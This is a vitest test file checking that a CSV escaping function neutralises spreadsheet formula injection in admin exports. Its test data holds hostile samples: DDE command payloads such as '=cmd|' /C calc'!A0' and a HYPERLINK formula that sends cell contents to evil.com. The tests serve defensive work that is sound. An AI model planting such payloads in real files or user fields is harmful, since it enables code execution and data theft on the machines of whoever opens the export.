/**
 * tests/csv-escape.test.ts
 *
 * Audit 2026-08-05, phase 2 — CSV formula injection.
 *
 * Every field in the four admin exports is attacker-supplied: lead names, poll
 * answers, journey free text. `=cmd|' /C calc'!A0` is inert in the database and
 * an executable formula the moment an admin opens the export in Excel — code
 * execution on the exporter's machine, from data any signed-up user can write.
 *
 * Quoting alone does not help: the spreadsheet strips the quotes and still
 * evaluates the leading `=`.
 */

import { describe, expect, it } from "vitest";
import { csvEscape, csvRow, isFormulaLike } from "@/lib/csv-escape";

const PAYLOAD = "=cmd|' /C calc'!A0";

describe("formula neutralisation", () => {
  it("defuses the work order's payload", () => {
    const out = csvEscape(PAYLOAD);
    expect(out.startsWith("'") || out.startsWith('"\'')).toBe(true);
    // The apostrophe must precede the '=', not follow it.
    expect(out.replace(/^"/, "").startsWith("'=")).toBe(true);
  });

  it("prefixes every formula lead character", () => {
    for (const lead of ["=", "+", "-", "@", "\t", "\r"]) {
      const value = `${lead}danger`;
      expect(isFormulaLike(value), JSON.stringify(lead)).toBe(true);
      // The escaped output always carries the apostrophe before the lead char,
      // whether or not the value also needed quoting.
      const out = csvEscape(value);
      const inner = out.startsWith('"') ? out.slice(1, -1) : out;
      expect(inner.startsWith(`'${lead}`), JSON.stringify(lead)).toBe(true);
    }
  });

  it("defuses the classic exfiltration and DDE payloads", () => {
    for (const payload of [
      '=HYPERLINK("https://evil.com?d="&A1,"click")',
      "+cmd|' /C calc'!A0",
      "@SUM(1+9)*cmd|' /C calc'!A0",
      "-2+3+cmd|' /C calc'!A0",
    ]) {
      const out = csvEscape(payload);
      const inner = out.startsWith('"') ? out.slice(1, -1) : out;
      expect(inner.startsWith("'"), payload).toBe(true);
    }
  });

  it("leaves ordinary values completely alone", () => {
    expect(csvEscape("Itzik Bar-Lev")).toBe("Itzik Bar-Lev");
    expect(csvEscape("יצחק בר-לב")).toBe("יצחק בר-לב");
    expect(csvEscape("someone@example.com")).toBe("someone@example.com");
    expect(csvEscape(42)).toBe("42");
    expect(csvEscape(null)).toBe("");
    expect(csvEscape(undefined)).toBe("");
  });
});

describe("RFC-4180 quoting is preserved", () => {
  it("quotes commas, quotes and newlines exactly as before", () => {
    expect(csvEscape("a,b")).toBe('"a,b"');
    expect(csvEscape('say "hi"')).toBe('"say ""hi"""');
    expect(csvEscape("line1\nline2")).toBe('"line1\nline2"');
  });

  it("applies both when a value is a formula AND needs quoting", () => {
    // Apostrophe inside the quotes, quotes still doubled.
    expect(csvEscape('=A1,"x"')).toBe('"\'=A1,""x"""');
  });

  it("joins a row", () => {
    expect(csvRow(["ok", PAYLOAD, 7])).toBe(`ok,'=cmd|' /C calc'!A0,7`);
  });
});
